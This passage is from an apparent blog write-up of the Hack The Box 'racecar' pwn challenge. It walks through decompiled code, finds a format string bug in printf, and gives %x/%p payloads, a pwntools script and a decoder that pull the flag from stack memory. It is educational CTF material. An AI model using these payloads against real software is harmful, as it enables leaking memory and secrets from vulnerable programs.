      iVar3 <span style=color:#f92672>=</span> iVar3 <span style=color:#f92672>%</span> <span style=color:#ae81ff>100</span>;
    }
  }
  local_54 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
  <span style=color:#66d9ef>while</span>( true ) {
    sVar4 <span style=color:#f92672>=</span> strlen(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[*] Waiting for the race to finish...&#34;</span>);
    <span style=color:#66d9ef>if</span> (sVar4 <span style=color:#f92672>&lt;=</span> local_54) <span style=color:#66d9ef>break</span>;
    putchar((<span style=color:#66d9ef>int</span>)<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[*] Waiting for the race to finish...&#34;</span>[local_54]);
    <span style=color:#66d9ef>if</span> (<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[*] Waiting for the race to finish...&#34;</span>[local_54] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;.&#39;</span>) {
      sleep(<span style=color:#ae81ff>0</span>);
    }
    local_54 <span style=color:#f92672>=</span> local_54 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
  }
  <span style=color:#66d9ef>if</span> (((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;&amp;</span> (iVar2 <span style=color:#f92672>&lt;</span> iVar3)) <span style=color:#f92672>||</span> ((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>&amp;&amp;</span> (iVar3 <span style=color:#f92672>&lt;</span> iVar2)))) {
    printf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>[+] You won the race!! You get 100 coins!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#f92672>&amp;</span>DAT_00011540);
    coins <span style=color:#f92672>=</span> coins <span style=color:#f92672>+</span> <span style=color:#ae81ff>100</span>;
    puVar5 <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>DAT_00011538;
    printf(<span style=color:#e6db74>&#34;[+] Current coins: [%d]%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,coins,<span style=color:#f92672>&amp;</span>DAT_00011538);
    printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[!] Do you have anything to say to the press after your big victory?</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&gt; %s&#34;</span>,
           <span style=color:#f92672>&amp;</span>DAT_000119de);
    __format <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)malloc(<span style=color:#ae81ff>0x171</span>);
    __stream <span style=color:#f92672>=</span> fopen(<span style=color:#e6db74>&#34;flag.txt&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
    <span style=color:#66d9ef>if</span> (__stream <span style=color:#f92672>==</span> (FILE <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>) {
      printf(<span style=color:#e6db74>&#34;%s[-] Could not open flag.txt. Please contact the creator.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#f92672>&amp;</span>DAT_00011548,puVar5);
                    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
      exit(<span style=color:#ae81ff>0x69</span>);
    }
    fgets(local_3c,<span style=color:#ae81ff>0x2c</span>,__stream);
    read(<span style=color:#ae81ff>0</span>,__format,<span style=color:#ae81ff>0x170</span>);
    puts(
        <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n\x1b</span><span style=color:#e6db74>[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: </span><span style=color:#ae81ff>\x1b</span><span style=color:#e6db74>[0m&#34;</span>
        );
    printf(__format);
  }
  <span style=color:#66d9ef>else</span> {
    <span style=color:#66d9ef>if</span> (((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>&amp;&amp;</span> (iVar3 <span style=color:#f92672>&lt;</span> iVar2)) <span style=color:#f92672>||</span> ((iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>&amp;&amp;</span> (iVar2 <span style=color:#f92672>&lt;</span> iVar3)))) {
      printf(<span style=color:#e6db74>&#34;%s</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>[-] You lost the race and all your coins!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#f92672>&amp;</span>DAT_00011548);
      coins <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      printf(<span style=color:#e6db74>&#34;[+] Current coins: [%d]%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#ae81ff>0</span>,<span style=color:#f92672>&amp;</span>DAT_00011538);
    }
  }
  <span style=color:#66d9ef>if</span> (local_10 <span style=color:#f92672>!=</span> <span style=color:#f92672>*</span>(<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>)(in_GS_OFFSET <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>)) {
    __stack_chk_fail_local();
  }
  <span style=color:#66d9ef>return</span>;
}
</code></pre></div><p>You can carefully examine it for studying purpose, but to keep it short, basically it&rsquo;s:</p>
<ul>
<li>If you choose car 1 and race 2, or car 2 and race 1, you win</li>
<li>When you win, it let you input something there, and print it back out</li>
</ul>
<p>Here&rsquo;s what would happen:
<img loading=lazy src=/img/racecar/test-run.gif#center alt>
</p>
<p>Now that we&rsquo;ve known what this program does, how to exploit it?</p>
<p>See this little, cute command somewhere on the 82th line of <code>car_menu()</code> function? :D</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>printf(__format);
</code></pre></div><p>Yeah, as clear as day, a <a href=https://owasp.org/www-community/attacks/Format_string_attack>format string vulnerability</a>!</p>
<p>Try to insert a payload there:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>[<span style=color:#f92672>!</span>] Do you have anything to say to the press after your big victory<span style=color:#f92672>?</span>
<span style=color:#f92672>&gt;</span> <span style=color:#f92672>%</span>x<span style=color:#f92672>%</span>x

The Man, the Myth, the Legend<span style=color:#f92672>!</span> The grand winner of the race wants the whole world to know this: 
<span style=color:#ae81ff>57916200170</span>
</code></pre></div><p>Well, it&rsquo;s vulnerable.</p>
<p>Since it&rsquo;s quite troublesome to enter our payload each time, here&rsquo;s an on-the-spot Python script to make our life easier. :D</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>

<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>

context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ERROR&#39;</span>

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(payload: str):
	conn <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./racecar&#39;</span>)
	conn<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Name&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;aki&#39;</span>)
	conn<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Nickname&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;aki&#39;</span>)
	conn<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;selection&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
	conn<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;car&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
	conn<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Circuit&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
	conn<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;victory?&#39;</span>, bytes(payload, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;utf-8&#39;</span>))
	conn<span style=color:#f92672>.</span>recv()
	print(conn<span style=color:#f92672>.</span>recv()<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
	conn<span style=color:#f92672>.</span>close()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
	<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
		exploit(input(<span style=color:#e6db74>&#39;Enter payload: &#39;</span>))
</code></pre></div><p>I also created a <code>flag.txt</code> contains only <code>AAAA</code>, since that&rsquo;ll be <code>41414141</code> in hex - much easier to spot.</p>
<pre tabindex=0><code>[!] Do you have anything to say to the press after your big victory?
&gt; %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x568e4200 0x170 0x565c8d85 0x5 0x4c 0x26 0x1 0x2 0x565c996c 0x568e4200 0x568e4380 0x41414141 0xa414141 0xf7db0100 0xaf7cc300 0x565c9d58 0x565cbf8c 0xffda98c8 0x565c938d 0x565c9540
</code></pre><p>It&rsquo;s the 12th! Now, do just the same with the server, we get:</p>
<pre tabindex=0><code>0x574361c0 0x170 0x56555d85 0x1 0x5e 0x26 0x1 0x2 0x5655696c 0x574361c0 0x57436340 0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f 0xf149d800 0xf7f9e3fc 0x56558f8c 0xfffe9b38 0x56556441 0x1 0xfffe9be4 0xfffe9bec
</code></pre><p>It doesn&rsquo;t make much sense, does it? So let&rsquo;s spin up another convenient script:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#f92672>import</span> re

raw_flag <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Enter the raw data: &#34;</span>)

raw_flag <span style=color:#f92672>=</span> raw_flag<span style=color:#f92672>.</span>split()[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]

<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(raw_flag)):
	raw_flag[i] <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>&#39;..&#39;</span>, raw_flag[i])

flag <span style=color:#f92672>=</span> []
<span style=color:#66d9ef>for</span> chars <span style=color:#f92672>in</span> raw_flag:
	word <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
	<span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> chars[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]:
		<span style=color:#66d9ef>if</span> char <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;0x&#39;</span>:
			word <span style=color:#f92672>+=</span> chr(int(char, <span style=color:#ae81ff>16</span>))
	flag<span style=color:#f92672>.</span>append(word)

flag<span style=color:#f92672>.</span>reverse()
print(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(flag))
</code></pre></div><p>Since it&rsquo;s not a piece of cake to filter out which bytes are meaningful, let&rsquo;s just plug all retrieved data to the script, and whatever gibberish it yield out must contain our flag!</p>
<p>In case you&rsquo;re curious, here&rsquo;s that gibberish:</p>
<pre tabindex=0><code>]UV^&amp;liUVÀaCW@cCWHTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}ØIñüãù÷UV8dUVä
</code></pre><p>See our flag in the middle? :D</p>
<p>And that&rsquo;s it. Nice challenge!</p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://git-akihakune.github.io/tags/pwn/>pwn</a></li>
<li><a href=https://git-akihakune.github.io/tags/htb/>htb</a></li>
<li><a href=https://git-akihakune.github.io/tags/ctf/>ctf</a></li>
</ul>
<nav class=paginav>
<a class=next href=https://git-akihakune.github.io/blog/previse/>
<span class=title>Next Page »</span>
<br>
<span>Hack The Box - Previse writeup</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box Pwn challenge - racecar on twitter" href="https://twitter.com/intent/tweet/?text=Hack%20The%20Box%20Pwn%20challenge%20-%20racecar&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fracecar%2f&hashtags=pwn%2chtb%2cctf"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box Pwn challenge - racecar on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fracecar%2f&title=Hack%20The%20Box%20Pwn%20challenge%20-%20racecar&summary=Hack%20The%20Box%20Pwn%20challenge%20-%20racecar&source=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fracecar%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box Pwn challenge - racecar on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fracecar%2f&title=Hack%20The%20Box%20Pwn%20challenge%20-%20racecar"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box Pwn challenge - racecar on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fracecar%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box Pwn challenge - racecar on whatsapp" href="https://api.whatsapp.com/send?text=Hack%20The%20Box%20Pwn%20challenge%20-%20racecar%20-%20https%3a%2f%2fgit-akihakune.github.io%2fblog%2fracecar%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Hack The Box Pwn challenge - racecar on telegram" href="https://telegram.me/share/url?text=Hack%20The%20Box%20Pwn%20challenge%20-%20racecar&url=https%3a%2f%2fgit-akihakune.github.io%2fblog%2fracecar%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://git-akihakune.github.io>Hakune Blog</a></span>
- Aki Hakune
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>